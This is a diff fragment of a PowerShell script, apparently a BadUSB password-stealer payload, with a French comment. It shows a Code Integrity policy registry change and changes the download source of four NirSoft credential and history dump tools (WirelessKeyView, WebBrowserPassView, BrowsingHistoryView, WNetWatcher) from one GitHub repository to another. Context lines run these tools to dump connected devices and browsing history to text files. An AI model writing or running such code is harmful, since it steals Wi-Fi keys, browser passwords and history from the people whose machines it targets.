@@ -11,10 +11,10 @@ Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name 
 CiTool --refresh --json
 
 # URLs corrigées en mode Raw direct pour éviter l'interruption de connexion GitHub
-Invoke-WebRequest "https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/WirelessKeyView.exe" -OutFile WirelessKeyView.exe
-Invoke-WebRequest "https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/WebBrowserPassView.exe" -OutFile WebBrowserPassView.exe
-Invoke-WebRequest "https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/BrowsingHistoryView.exe" -OutFile BrowsingHistoryView.exe
-Invoke-WebRequest "https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/WNetWatcher.exe" -OutFile WNetWatcher.exe
+Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WirelessKeyView.exe" -OutFile WirelessKeyView.exe
+Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WebBrowserPassView.exe" -OutFile WebBrowserPassView.exe
+Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/BrowsingHistoryView.exe" -OutFile BrowsingHistoryView.exe
+Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WNetWatcher.exe" -OutFile WNetWatcher.exe
 
 .\WNetWatcher.exe /stext connected_devices.txt
 .\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt
